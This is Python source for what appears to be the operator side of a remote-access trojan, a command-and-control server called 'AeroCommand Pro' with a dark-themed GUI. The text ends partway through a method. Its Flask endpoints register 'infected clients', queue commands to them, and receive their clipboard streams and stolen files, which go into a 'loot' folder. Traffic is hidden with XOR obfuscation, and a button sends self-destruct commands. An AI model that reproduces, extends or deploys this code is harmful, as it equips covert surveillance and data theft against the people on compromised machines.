import os
import sys
import time
import json
import base64
import sqlite3
import logging
import threading
import psutil
from datetime import datetime
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import customtkinter as ctk
from PIL import Image, ImageTk
from flask import Flask, request

# ==================== CONFIGURATION & CONSTANTS ====================
DB_FILE = "aerocommand.db"
LOOT_DIR = "loot"
XOR_KEY = 0x5A
DEFAULT_PORT = 443
HEARTBEAT_TIMEOUT = 60  # seconds

# Professional Color Palette
COLOR_BG = "#0f172a"          # Slate 900
COLOR_SIDEBAR = "#1e293b"     # Slate 800
COLOR_CARD = "#1e293b"        # Slate 800
COLOR_ACCENT = "#38bdf8"      # Sky 400
COLOR_ACCENT_ALT = "#8b5cf6"  # Violet 500
COLOR_SUCCESS = "#10b981"     # Emerald 500
COLOR_WARNING = "#f59e0b"     # Amber 500
COLOR_DANGER = "#ef4444"      # Red 500
COLOR_TEXT_MAIN = "#f8fafc"   # Slate 50
COLOR_TEXT_MUTED = "#94a3b8"  # Slate 400
COLOR_BORDER = "#334155"      # Slate 700

# Ensure directories exist
os.makedirs(LOOT_DIR, exist_ok=True)

# Set CustomTkinter theme
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

# ==================== DATABASE HELPERS ====================
def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS clients (
                client_id TEXT PRIMARY KEY,
                host TEXT,
                ip TEXT,
                pid INTEGER,
                os TEXT,
                user TEXT,
                admin INTEGER,
                first_seen TEXT,
                last_seen TEXT,
                status TEXT
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS command_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                command TEXT,
                output TEXT,
                timestamp TEXT
            )
        """)
        conn.commit()

init_db()

def db_save_client(info):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO clients (client_id, host, ip, pid, os, user, admin, first_seen, last_seen, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'ALIVE')
            ON CONFLICT(client_id) DO UPDATE SET
                pid=excluded.pid,
                last_seen=excluded.last_seen,
                status='ALIVE'
        """, (
            info['client_id'],
            info.get('host', 'unknown'),
            info.get('ip', 'unknown'),
            info.get('pid', 0),
            info.get('os', 'Unknown'),
            info.get('user', 'unknown'),
            1 if info.get('admin') else 0,
            now,
            now
        ))
        conn.commit()

def db_log_command(client_id, command, output):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO command_logs (client_id, command, output, timestamp)
            VALUES (?, ?, ?, ?)
        """, (client_id, command, output, now))
        conn.commit()


# ==================== CRYPTO HELPERS ====================
def xor_encrypt(data: str) -> str:
    encrypted = bytes([b ^ XOR_KEY for b in data.encode('utf-8', errors='replace')])
    return base64.b64encode(encrypted).decode()

def xor_decrypt(data: str) -> str:
    raw = base64.b64decode(data)
    decrypted = bytes([b ^ XOR_KEY for b in raw])
    return decrypted.decode('utf-8', errors='replace')

def decrypt_payload(raw_data):
    try:
        decrypted = xor_decrypt(raw_data)
        return json.loads(decrypted)
    except Exception:
        try:
            return json.loads(raw_data)
        except Exception:
            return {}

def encrypt_response(data):
    return xor_encrypt(json.dumps(data))


# ==================== GLOBAL C2 STATE ====================
class C2State:
    def __init__(self):
        self.lock = threading.Lock()
        self.infected_clients = {}  # cid -> dict
        self.pending_commands = {}  # cid -> list
        self.target_client = None
        self.start_time = datetime.now()
        self.log_callbacks = []
        self.client_update_callbacks = []
        self.result_callbacks = []
        self.clipboard_callbacks = []
        self.file_callbacks = []
        self.server_port = DEFAULT_PORT
        self.is_running = False

    def add_log(self, text, tag="info"):
        ts = datetime.now().strftime("%H:%M:%S")
        msg = f"[{ts}] {text}"
        for cb in self.log_callbacks:
            try:
                cb(msg, tag)
            except Exception:
                pass

    def notify_clients_updated(self):
        for cb in self.client_update_callbacks:
            try:
                cb()
            except Exception:
                pass

    def notify_result(self, client_id, output):
        for cb in self.result_callbacks:
            try:
                cb(client_id, output)
            except Exception:
                pass

    def notify_clipboard(self, client_id, text):
        for cb in self.clipboard_callbacks:
            try:
                cb(client_id, text)
            except Exception:
                pass

    def notify_file(self, client_id, filename, filepath, size):
        for cb in self.file_callbacks:
            try:
                cb(client_id, filename, filepath, size)
            except Exception:
                pass

state = C2State()


# ==================== FLASK SERVER ====================
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

server_app = Flask(__name__)
server_app.logger.setLevel(logging.ERROR)

@server_app.route("/test", methods=["GET"])
def test_route():
    return "SERVER RUNNING OK", 200

@server_app.route("/register", methods=["POST"])
def register_route():
    raw = request.get_data(as_text=True)
    info = decrypt_payload(raw)
    client_id = info.get("client_id", f"{info.get('ip', 'unknown')}:{info.get('pid', 0)}")
    now = datetime.now()
    new_host = info.get('host', 'unknown')
    new_ip = info.get('ip', 'unknown')

    with state.lock:
        stale_ids = [
            cid for cid, c in state.infected_clients.items()
            if cid != client_id and c['host'] == new_host and c['ip'] == new_ip
        ]
        for stale in stale_ids:
            del state.infected_clients[stale]
            if stale in state.pending_commands:
                del state.pending_commands[stale]
            if state.target_client == stale:
                state.target_client = client_id

        is_new = client_id not in state.infected_clients
        state.infected_clients[client_id] = {
            'client_id': client_id,
            'ip': new_ip,
            'host': new_host,
            'pid': info.get('pid', 0),
            'os': info.get('os', 'Unknown'),
            'user': info.get('user', 'unknown'),
            'admin': info.get('admin', False),
            'registered': now.strftime("%H:%M:%S"),
            'last_seen': now,
        }
        if state.target_client is None:
            state.target_client = client_id

        db_save_client(info)

    admin_str = " [ADMIN]" if info.get('admin') else ""
    if is_new:
        state.add_log(f"New client connected: {new_host} ({new_ip}) PID:{info.get('pid')}{admin_str}", "success")
    else:
        state.add_log(f"Client re-registered: {new_host} ({new_ip})", "info")

    state.notify_clients_updated()
    return "OK", 200

@server_app.route("/cmd", methods=["GET"])
def get_command_route():
    client_id = request.args.get("id")
    if not client_id:
        return "", 200

    with state.lock:
        if client_id not in state.infected_clients:
            return encrypt_response({"action": "re-register"}), 200

        state.infected_clients[client_id]['last_seen'] = datetime.now()

        if client_id in state.pending_commands and state.pending_commands[client_id]:
            cmd = state.pending_commands[client_id].pop(0)
            if not state.pending_commands[client_id]:
                del state.pending_commands[client_id]
            return encrypt_response({"command": cmd}), 200

    return "", 200

@server_app.route("/result", methods=["POST"])
def result_route():
    raw = request.get_data(as_text=True)
    data = decrypt_payload(raw)
    output = data.get('output', '')
    client_id = data.get('client_id', request.remote_addr)

    with state.lock:
        client_info = state.infected_clients.get(client_id, {})
        host_label = client_info.get('host', client_id)

    if output.startswith("[📋 CLIPBOARD]"):
        clip_content = output.replace("[📋 CLIPBOARD]", "").strip()
        state.notify_clipboard(client_id, clip_content)
        state.add_log(f"Clipboard received from {host_label}", "clip")
    else:
        state.add_log(f"Command output received from {host_label}", "output")
        state.notify_result(client_id, output)

    db_log_command(client_id, "COMMAND_RESULT", output)
    return "OK", 200

@server_app.route("/upload", methods=["POST"])
def upload_route():
    raw = request.get_data(as_text=True)
    data = decrypt_payload(raw)
    filename = data.get("name", "unknown")
    file_b64 = data.get("file", "")
    try:
        file_data = base64.b64decode(file_b64)
    except Exception:
        file_data = b""

    client_id = data.get("client_id", request.remote_addr)

    with state.lock:
        host = state.infected_clients.get(client_id, {}).get('host', 'unknown')

    client_loot_dir = os.path.join(LOOT_DIR, host)
    os.makedirs(client_loot_dir, exist_ok=True)

    save_path = os.path.join(client_loot_dir, filename)
    if os.path.exists(save_path):
        name, ext = os.path.splitext(filename)
        save_path = os.path.join(client_loot_dir, f"{name}_{int(time.time())}{ext}")

    with open(save_path, "wb") as f:
        f.write(file_data)

    state.add_log(f"Received file: {filename} ({len(file_data)} bytes) from {host}", "success")
    state.notify_file(client_id, filename, save_path, len(file_data))
    return "OK", 200


def heartbeat_thread_func():
    while True:
        time.sleep(15)
        now = datetime.now()
        with state.lock:
            dead = [
                cid for cid, info in state.infected_clients.items()
                if (now - info.get('last_seen', now)).total_seconds() > HEARTBEAT_TIMEOUT * 3
            ]
            for cid in dead:
                del state.infected_clients[cid]
                if cid in state.pending_commands:
                    del state.pending_commands[cid]
            if state.target_client in dead:
                state.target_client = list(state.infected_clients.keys())[0] if state.infected_clients else None

        if dead:
            state.add_log(f"Purged {len(dead)} dead/timed-out client(s)", "warning")
            state.notify_clients_updated()


# ==================== MODERN GUI APPLICATION ====================
class AeroCommandPro(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("⚡ AeroCommand Pro — C2 Administration")
        self.geometry("1280x820")
        self.minsize(1100, 700)
        self.configure(fg_color=COLOR_BG)

        # UI State
        self.active_panel = "dashboard"
        self.nav_buttons = {}
        self.cmd_history = []
        self.cmd_history_idx = -1
        self.cpu_history = [0] * 30
        self.ram_history = [0] * 30

        # Grid Layout
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)

        self._setup_sidebar()
        self._setup_main_area()
        self._setup_state_bindings()
        
        # Start background processes
        self.start_server_thread()
        threading.Thread(target=heartbeat_thread_func, daemon=True).start()
        self.after(1000, self._update_uptime)
        self.after(1000, self._update_resource_graphs)
        self.after(2000, self._periodic_ui_refresh)

        # Initial selection
        self.select_panel("dashboard")

    def _setup_sidebar(self):
        self.sidebar = ctk.CTkFrame(self, width=240, corner_radius=0, fg_color=COLOR_SIDEBAR, border_width=0)
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        self.sidebar.grid_rowconfigure(10, weight=1)

        # Logo Section
        self.logo_frame = ctk.CTkFrame(self.sidebar, fg_color="transparent")
        self.logo_frame.grid(row=0, column=0, padx=20, pady=(30, 20), sticky="ew")
        
        self.logo_icon = ctk.CTkLabel(self.logo_frame, text="⚡", font=ctk.CTkFont(size=28), text_color=COLOR_ACCENT)
        self.logo_icon.pack(side="left", padx=(0, 10))
        
        self.logo_text = ctk.CTkLabel(self.logo_frame, text="AeroCommand", font=ctk.CTkFont(size=20, weight="bold"), text_color=COLOR_TEXT_MAIN)
        self.logo_text.pack(side="left")

        # Navigation
        nav_items = [
            ("dashboard", "🏠 Dashboard"),
            ("clients", "💻 Endpoints"),
            ("terminal", "⚡ Command Center"),
            ("files", "📂 File & Loot"),
            ("clipboard", "📋 Clipboard Stream"),
            ("database", "🗄️ History & Logs"),
            ("settings", "⚙️ Server Config"),
        ]

        for i, (key, label_text) in enumerate(nav_items, start=1):
            parts = label_text.split(" ", 1)
            icon = parts[0]
            title = parts[1] if len(parts) > 1 else ""

            btn_frame = ctk.CTkFrame(self.sidebar, fg_color="transparent", corner_radius=4, height=42, cursor="hand2")
            btn_frame.grid(row=i, column=0, padx=12, pady=3, sticky="ew")
            btn_frame.grid_propagate(False)
            btn_frame.grid_columnconfigure(0, minsize=36, weight=0)
            btn_frame.grid_columnconfigure(1, weight=1)
            btn_frame.grid_rowconfigure(0, weight=1)

            icon_lbl = ctk.CTkLabel(btn_frame, text=icon, font=ctk.CTkFont(size=16), anchor="center")
            icon_lbl.grid(row=0, column=0, sticky="ns")

            text_lbl = ctk.CTkLabel(btn_frame, text=title, font=ctk.CTkFont(size=14, weight="bold"), text_color=COLOR_TEXT_MUTED, anchor="w")
            text_lbl.grid(row=0, column=1, sticky="w", padx=(4, 0))

            self.nav_buttons[key] = (btn_frame, icon_lbl, text_lbl)

            def make_handler(k):
                return lambda e: self.select_panel(k)

            def make_enter(frame, k):
                return lambda e: frame.configure(fg_color=COLOR_BORDER) if self.active_panel != k else None

            def make_leave(frame, k):
                return lambda e: frame.configure(fg_color="transparent") if self.active_panel != k else None

            for widget in (btn_frame, icon_lbl, text_lbl):
                widget.bind("<Button-1>", make_handler(key))
                widget.bind("<Enter>", make_enter(btn_frame, key))
                widget.bind("<Leave>", make_leave(btn_frame, key))

        # Server Status
        self.status_panel = ctk.CTkFrame(self.sidebar, fg_color=COLOR_BG, corner_radius=4, border_width=1, border_color=COLOR_BORDER)
        self.status_panel.grid(row=11, column=0, padx=12, pady=15, sticky="ew")
        
        self.status_dot = ctk.CTkLabel(self.status_panel, text="●", font=ctk.CTkFont(size=14), text_color=COLOR_SUCCESS)
        self.status_dot.pack(side="left", padx=(12, 6), pady=12)
        
        self.status_text = ctk.CTkLabel(self.status_panel, text=f"Port {DEFAULT_PORT} Active", font=ctk.CTkFont(size=12, weight="bold"), text_color=COLOR_TEXT_MAIN)
        self.status_text.pack(side="left", pady=12)

    def _setup_main_area(self):
        self.main_container = ctk.CTkFrame(self, fg_color="transparent")
        self.main_container.grid(row=0, column=1, sticky="nsew", padx=25, pady=25)
        self.main_container.grid_rowconfigure(1, weight=1)
        self.main_container.grid_columnconfigure(0, weight=1)

        # Top Bar (Header + Notifications)
        self.header_bar = ctk.CTkFrame(self.main_container, fg_color="transparent")
        self.header_bar.grid(row=0, column=0, sticky="ew", pady=(0, 20))
        
        self.page_title = ctk.CTkLabel(self.header_bar, text="Dashboard", font=ctk.CTkFont(size=26, weight="bold"), text_color=COLOR_TEXT_MAIN)
        self.page_title.pack(side="left")

        self.toast_frame = ctk.CTkFrame(self.header_bar, fg_color=COLOR_ACCENT, corner_radius=20, height=32)
        self.toast_label = ctk.CTkLabel(self.toast_frame, text="", font=ctk.CTkFont(size=12, weight="bold"), text_color=COLOR_BG)
        self.toast_label.pack(padx=15, pady=4)
        self.toast_frame.pack(side="right")
        self.toast_frame.pack_forget()

        # Panels Container
        self.panels = {}
        self._init_panels()

    def _init_panels(self):
        self.panels["dashboard"] = self._create_dashboard()
        self.panels["clients"] = self._create_clients()
        self.panels["terminal"] = self._create_terminal()
        self.panels["files"] = self._create_files()
        self.panels["clipboard"] = self._create_clipboard()
        self.panels["database"] = self._create_database()
        self.panels["settings"] = self._create_settings()

        for panel in self.panels.values():
            panel.grid(row=1, column=0, sticky="nsew")

    def select_panel(self, name):
        self.active_panel = name
        self.page_title.configure(text=name.capitalize())
        
        for k, item in self.nav_buttons.items():
            if isinstance(item, tuple):
                frame, icon_lbl, text_lbl = item
                if k == name:
                    frame.configure(fg_color=COLOR_ACCENT)
                    icon_lbl.configure(text_color=COLOR_BG)
                    text_lbl.configure(text_color=COLOR_BG, font=ctk.CTkFont(size=14, weight="bold"))
                else:
                    frame.configure(fg_color="transparent")
                    icon_lbl.configure(text_color=COLOR_TEXT_MAIN)
                    text_lbl.configure(text_color=COLOR_TEXT_MUTED, font=ctk.CTkFont(size=14))
            else:
                if k == name:
                    item.configure(fg_color=COLOR_ACCENT, text_color=COLOR_BG, font=ctk.CTkFont(size=14, weight="bold"))
                else:
                    item.configure(fg_color="transparent", text_color=COLOR_TEXT_MUTED, font=ctk.CTkFont(size=14))
        
        self.panels[name].tkraise()
        
        if name == "database": self._load_db()
        elif name == "files": self._refresh_files()
        elif name == "clients": self._refresh_clients()

    def show_toast(self, msg, duration=3000):
        self.toast_label.configure(text=msg)
        self.toast_frame.pack(side="right")
        self.after(duration, lambda: self.toast_frame.pack_forget())

    # --- Dashboard Panel ---
    def _create_dashboard(self):
        panel = ctk.CTkFrame(self.main_container, fg_color="transparent")
        panel.grid_columnconfigure((0, 1, 2, 3), weight=1)
        panel.grid_rowconfigure(1, weight=1)

        # Metric Cards
        self.metrics = {}
        metrics_data = [
            ("online", "Active Endpoints", "0", COLOR_SUCCESS, "💻"),
            ("total", "Total Registered", "0", COLOR_ACCENT, "📊"),
            ("target", "Current Target", "None", COLOR_ACCENT_ALT, "🎯"),
            ("uptime", "Server Uptime", "00:00:00", COLOR_WARNING, "⏱️")
        ]

        for i, (key, label, val, color, icon) in enumerate(metrics_data):
            card = self._create_pro_card(panel, label, val, color, icon)
            card.grid(row=0, column=i, padx=8, sticky="ew")
            self.metrics[key] = card.winfo_children()[2] # The value label

        # Resource Monitoring Section (CPU & RAM Graphs)
        res_frame = ctk.CTkFrame(panel, fg_color="transparent")
        res_frame.grid(row=1, column=0, columnspan=4, sticky="ew", pady=(20, 0))
        res_frame.grid_columnconfigure((0, 1), weight=1)

        # CPU Card
        cpu_card = ctk.CTkFrame(res_frame, fg_color=COLOR_CARD, corner_radius=4, border_width=1, border_color=COLOR_BORDER)
        cpu_card.grid(row=0, column=0, padx=(0, 8), sticky="ew")
        
        ctk.CTkLabel(cpu_card, text="🖥️ CPU Utilization", font=ctk.CTkFont(size=14, weight="bold"), text_color=COLOR_TEXT_MAIN).pack(anchor="w", padx=15, pady=(15, 2))
        self.cpu_val_lbl = ctk.CTkLabel(cpu_card, text="0.0%", font=ctk.CTkFont(size=13, weight="bold"), text_color=COLOR_ACCENT)
        self.cpu_val_lbl.pack(anchor="w", padx=15, pady=(0, 5))
        
        self.cpu_canvas = ctk.CTkCanvas(cpu_card, height=90, bg=COLOR_BG, highlightthickness=0)
        self.cpu_canvas.pack(fill="x", padx=15, pady=(0, 15))

        # RAM Card
        ram_card = ctk.CTkFrame(res_frame, fg_color=COLOR_CARD, corner_radius=4, border_width=1, border_color=COLOR_BORDER)
        ram_card.grid(row=0, column=1, padx=(8, 0), sticky="ew")
        
        ctk.CTkLabel(ram_card, text="💾 Memory (RAM) Utilization", font=ctk.CTkFont(size=14, weight="bold"), text_color=COLOR_TEXT_MAIN).pack(anchor="w", padx=15, pady=(15, 2))
        self.ram_val_lbl = ctk.CTkLabel(ram_card, text="0.0%", font=ctk.CTkFont(size=13, weight="bold"), text_color=COLOR_ACCENT_ALT)
        self.ram_val_lbl.pack(anchor="w", padx=15, pady=(0, 5))
        
        self.ram_canvas = ctk.CTkCanvas(ram_card, height=90, bg=COLOR_BG, highlightthickness=0)
        self.ram_canvas.pack(fill="x", padx=15, pady=(0, 15))

        # Event Stream
        stream_frame = ctk.CTkFrame(panel, fg_color=COLOR_CARD, corner_radius=4, border_width=1, border_color=COLOR_BORDER)
        stream_frame.grid(row=2, column=0, columnspan=4, sticky="nsew", pady=(20, 0))
        stream_frame.grid_rowconfigure(1, weight=1)
        stream_frame.grid_columnconfigure(0, weight=1)

        title_bar = ctk.CTkFrame(stream_frame, fg_color="transparent")
        title_bar.grid(row=0, column=0, sticky="ew", padx=20, pady=15)
        
        ctk.CTkLabel(title_bar, text="📡 Live Operational Stream", font=ctk.CTkFont(size=16, weight="bold")).pack(side="left")
        ctk.CTkButton(title_bar, text="Clear", width=60, height=24, fg_color=COLOR_BORDER, command=lambda: self.log_text.delete("1.0", "end")).pack(side="right")

        self.log_text = ctk.CTkTextbox(stream_frame, fg_color=COLOR_BG, text_color=COLOR_TEXT_MAIN, font=ctk.CTkFont(family="Consolas", size=13), border_width=0)
        self.log_text.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))

        # Quick Actions
        actions_frame = ctk.CTkFrame(panel, fg_color="transparent")
        actions_frame.grid(row=3, column=0, columnspan=4, sticky="ew", pady=(20, 0))
        
        ctk.CTkButton(actions_frame, text="📸 Screenshot", fg_color=COLOR_ACCENT, text_color=COLOR_BG, font=ctk.CTkFont(weight="bold"), command=lambda: self.send_cmd("screenshot")).pack(side="left", padx=(0, 10))
        ctk.CTkButton(actions_frame, text="ℹ️ System Info", fg_color=COLOR_SIDEBAR, border_width=1, border_color=COLOR_BORDER, command=lambda: self.send_cmd("sysinfo")).pack(side="left", padx=5)
        ctk.CTkButton(actions_frame, text="📋 Clipboard", fg_color=COLOR_SIDEBAR, border_width=1, border_color=COLOR_BORDER, command=lambda: self.send_cmd("clip")).pack(side="left", padx=5)

        return panel

    def _create_pro_card(self, parent, label, val, accent, icon):
        card = ctk.CTkFrame(parent, fg_color=COLOR_CARD, corner_radius=4, border_width=1, border_color=COLOR_BORDER)
        
        icon_lbl = ctk.CTkLabel(card, text=icon, font=ctk.CTkFont(size=24), text_color=accent)
        icon_lbl.pack(anchor="w", padx=20, pady=(20, 5))
        
        title_lbl = ctk.CTkLabel(card, text=label, font=ctk.CTkFont(size=12), text_color=COLOR_TEXT_MUTED)
        title_lbl.pack(anchor="w", padx=20)
        
        val_lbl = ctk.CTkLabel(card, text=val, font=ctk.CTkFont(size=22, weight="bold"), text_color=COLOR_TEXT_MAIN)
        val_lbl.pack(anchor="w", padx=20, pady=(0, 20))
        
        accent_bar = ctk.CTkFrame(card, height=3, fg_color=accent, corner_radius=0)
        accent_bar.pack(fill="x", side="bottom")
        
        return card

    # --- Clients Panel ---
    def _create_clients(self):
        panel = ctk.CTkFrame(self.main_container, fg_color="transparent")
        panel.grid_rowconfigure(1, weight=1)
        panel.grid_columnconfigure(0, weight=1)

        header = ctk.CTkFrame(panel, fg_color="transparent")
        header.grid(row=0, column=0, sticky="ew", pady=(0, 15))
        
        self.client_search = ctk.CTkEntry(header, placeholder_text="Filter endpoints...", width=300, height=36, border_color=COLOR_BORDER)
        self.client_search.pack(side="left")
        self.client_search.bind("<KeyRelease>", lambda e: self._refresh_clients())
        
        ctk.CTkButton(header, text="🔄 Refresh", width=100, height=36, fg_color=COLOR_SIDEBAR, border_width=1, border_color=COLOR_BORDER, command=self._refresh_clients).pack(side="right")

        self.client_list = ctk.CTkScrollableFrame(panel, fg_color=COLOR_BG, border_width=1, border_color=COLOR_BORDER, corner_radius=15)
        self.client_list.grid(row=1, column=0, sticky="nsew")

        return panel

    def _refresh_clients(self):
        for w in self.client_list.winfo_children(): w.destroy()
        
        query = self.client_search.get().lower()
        with state.lock:
            clients = dict(state.infected_clients)
            target = state.target_client

        for cid, info in clients.items():
            if query and not any(query in str(v).lower() for v in info.values()): continue
            
            is_target = (cid == target)
            card = ctk.CTkFrame(self.client_list, fg_color=COLOR_CARD if not is_target else "#162e45", border_width=1, border_color=COLOR_ACCENT if is_target else COLOR_BORDER, corner_radius=12)
            card.pack(fill="x", padx=10, pady=6)
            
            # Info
            info_box = ctk.CTkFrame(card, fg_color="transparent")
            info_box.pack(side="left", padx=20, pady=15)
            
            host_str = f"{info.get('host')} ({info.get('ip')})"
            ctk.CTkLabel(info_box, text=host_str, font=ctk.CTkFont(size=15, weight="bold"), text_color=COLOR_ACCENT if is_target else COLOR_TEXT_MAIN).pack(anchor="w")
            
            meta = f"OS: {info.get('os')}  |  User: {info.get('user')}  |  PID: {info.get('pid')}"
            ctk.CTkLabel(info_box, text=meta, font=ctk.CTkFont(size=12), text_color=COLOR_TEXT_MUTED).pack(anchor="w")
            
            # Actions
            btn_box = ctk.CTkFrame(card, fg_color="transparent")
            btn_box.pack(side="right", padx=20)
            
            if not is_target:
                ctk.CTkButton(btn_box, text="Select", width=80, height=30, fg_color=COLOR_ACCENT, text_color=COLOR_BG, command=lambda c=cid: self._set_target(c)).pack(side="left", padx=5)
            
            ctk.CTkButton(btn_box, text="Kill", width=80, height=30, fg_color=COLOR_DANGER, command=lambda c=cid: self._kill_client(c)).pack(side="left", padx=5)

    def _set_target(self, cid):
        with state.lock: state.target_client = cid
        self.show_toast(f"Target set to {cid[:8]}...")
        self._refresh_clients()
        self._update_metrics()

    def _kill_client(self, cid):
        if messagebox.askyesno("Confirm", "Send self-destruct to this endpoint?"):
            self.send_cmd_to("kill", cid)
            self.show_toast("Kill command dispatched")

    # --- Terminal Panel ---
    def _create_terminal(self):
        panel = ctk.CTkFrame(self.main_container, fg_color="transparent")
        panel.grid_rowconfigure(1, weight=1)
        panel.grid_columnconfigure(0, weight=1)

        # Header area with target label
        header_frame = ctk.CTkFrame(panel, fg_color="transparent")
        header_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        
        self.term_target = ctk.CTkLabel(header_frame, text="Target: None", font=ctk.CTkFont(size=16, weight="bold"), text_color=COLOR_ACCENT)
        self.term_target.pack(side="left")

        # Terminal Box Container (Row 1)
        term_box_frame = ctk.CTkFrame(panel, fg_color="transparent")
        term_box_frame.grid(row=1, column=0, sticky="nsew", pady=(0, 10))
        term_box_frame.grid_rowconfigure(0, weight=1)
        term_box_frame.grid_columnconfigure(0, weight=1)

        self.terminal = ctk.CTkTextbox(term_box_frame, fg_color="#090d16", text_color=COLOR_SUCCESS, font=ctk.CTkFont(family="Consolas", size=13), border_width=1, border_color=COLOR_BORDER)
        self.terminal.grid(row=0, column=0, sticky="nsew")

        # Quick Commands Suggestions Bar (Row 2) - Horizontal scrollable/wrapped buttons
        suggestions_container = ctk.CTkFrame(panel, fg_color=COLOR_CARD, corner_radius=10, border_width=1, border_color=COLOR_BORDER)
        suggestions_container.grid(row=2, column=0, sticky="ew", pady=(0, 10))
        
        ctk.CTkLabel(suggestions_container, text="⚡ Quick Commands:", font=ctk.CTkFont(size=12, weight="bold"), text_color=COLOR_ACCENT).pack(side="left", padx=(12, 5), pady=8)

        sug_scroll = ctk.CTkScrollableFrame(suggestions_container, orientation="horizontal", fg_color="transparent", height=40)
        sug_scroll.pack(side="left", fill="x", expand=True, padx=5, pady=4)

        suggestions = [
            ("📸 Screenshot", "screenshot"),
            ("ℹ️ System Info", "sysinfo"),
            ("📋 Get Clipboard", "clip"),
            ("▶️ Clip Watch", "clipwatch"),
            ("⏹️ Stop Clip", "clipstop"),
            ("💻 Task List", "tasklist"),
            ("👤 Whoami", "whoami"),
            ("🌐 IP Config", "ipconfig"),
            ("📂 Directory", "dir"),
            ("💀 Kill", "kill")
        ]

        for lbl, cmd in suggestions:
            btn = ctk.CTkButton(
                sug_scroll,
                text=lbl,
                height=30,
                corner_radius=6,
                fg_color=COLOR_SIDEBAR,
                hover_color=COLOR_BORDER,
                text_color=COLOR_TEXT_MAIN,
                font=ctk.CTkFont(size=12, weight="bold"),
                command=lambda c=cmd: self._fill_and_send(c)
            )
            btn.pack(side="left", padx=4, pady=2)

        # Autocomplete Suggestions Frame (Row 2.5, floating above input)
        self.autocomplete_frame = ctk.CTkFrame(panel, fg_color=COLOR_CARD, corner_radius=8, border_width=1, border_color=COLOR_BORDER)
        # Initially not gridded
        self.autocomplete_inner = ctk.CTkScrollableFrame(self.autocomplete_frame, fg_color="transparent", height=100)
        self.autocomplete_inner.pack(fill="both", expand=True, padx=5, pady=5)
        self.autocomplete_inner.grid_columnconfigure(0, weight=1)

        # Input Bar (Row 4)
        input_box = ctk.CTkFrame(panel, fg_color="transparent")
        input_box.grid(row=4, column=0, sticky="ew")
        
        self.term_input = ctk.CTkEntry(input_box, placeholder_text="Enter command... (or click quick commands above)", height=44, font=ctk.CTkFont(family="Consolas"), border_color=COLOR_BORDER)
        self.term_input.pack(side="left", fill="x", expand=True, padx=(0, 10))
        self.term_input.bind("<Return>", lambda e: self._term_send())
        self.term_input.bind("<KeyRelease>", self._on_term_key_release)
        
        ctk.CTkButton(input_box, text="Execute", width=120, height=44, fg_color=COLOR_ACCENT, text_color=COLOR_BG, font=ctk.CTkFont(weight="bold"), command=self._term_send).pack(side="right")

        self.available_commands = [
            "screenshot", "sysinfo", "clip", "clipwatch", "clipstop",
            "tasklist", "whoami", "ipconfig", "dir", "kill",
            "help", "ls", "cd", "pwd", "netstat", "ps", "env"
        ]

        return panel

    def _on_term_key_release(self, event):
        # Hide on return or escape
        if event.keysym in ("Return", "Escape", "Up", "Down"):
            if event.keysym == "Escape":
                self.autocomplete_frame.grid_forget()
            return

        text = self.term_input.get().strip().lower()
        # Only autocomplete the first word (command)
        cmd_typed = text.split()[0] if text else ""

        for w in self.autocomplete_inner.winfo_children():
            w.destroy()

        if not cmd_typed:
            self.autocomplete_frame.grid_forget()
            return

        matches = [c for c in self.available_commands if c.startswith(cmd_typed)]
        if not matches or (len(matches) == 1 and matches[0] == cmd_typed):
            self.autocomplete_frame.grid_forget()
            return

        # Position and show autocomplete frame just above input bar (Row 3)
        self.autocomplete_frame.grid(row=3, column=0, sticky="ew", pady=(0, 5))
        self.autocomplete_frame.lift()

        for idx, match in enumerate(matches):
            btn = ctk.CTkButton(
                self.autocomplete_inner,
                text=match,
                height=28,
                corner_radius=4,
                fg_color="transparent",
                hover_color=COLOR_BORDER,
                text_color=COLOR_ACCENT,
                anchor="w",
                font=ctk.CTkFont(family="Consolas", size=13, weight="bold"),
                command=lambda m=match: self._select_autocomplete(m)
            )
            btn.grid(row=idx, column=0, sticky="ew", pady=1)

    def _select_autocomplete(self, match):
        self.term_input.delete(0, "end")
        self.term_input.insert(0, match)
        self.autocomplete_frame.grid_forget()
        self.term_input.focus_set()

    def _fill_and_send(self, cmd):
        self.term_input.delete(0, "end")
        self.term_input.insert(0, cmd)
        self._term_send()

    def _term_send(self):
        cmd = self.term_input.get().strip()
        if not cmd: return
        self.send_cmd(cmd)
        self.terminal.insert("end", f"\n> {cmd}\n", "cmd")
        self.term_input.delete(0, "end")

    # --- Loot Panel ---
    def _create_files(self):
        panel = ctk.CTkFrame(self.main_container, fg_color="transparent")
        panel.grid_rowconfigure(1, weight=1)
        panel.grid_columnconfigure(0, weight=1)

        header = ctk.CTkFrame(panel, fg_color="transparent")
        header.grid(row=0, column=0, sticky="ew", pady=(0, 15))
        
        ctk.CTkButton(header, text="📁 Open Loot Folder", fg_color=COLOR_SIDEBAR, border_width=1, border_color=COLOR_BORDER, command=lambda: os.startfile(os.path.abspath(LOOT_DIR)) if hasattr(os, 'startfile') else os.system(f"xdg-open {LOOT_DIR}")).pack(side="left")
        ctk.CTkButton(header, text="🔄 Refresh", width=100, fg_color=COLOR_SIDEBAR, border_width=1, border_color=COLOR_BORDER, command=self._refresh_files).pack(side="right")

        self.file_scroll = ctk.CTkScrollableFrame(panel, fg_color=COLOR_BG, border_width=1, border_color=COLOR_BORDER, corner_radius=15)
        self.file_scroll.grid(row=1, column=0, sticky="nsew")

        return panel

    def _refresh_files(self):
        for w in self.file_scroll.winfo_children(): w.destroy()
        
        has_files = False
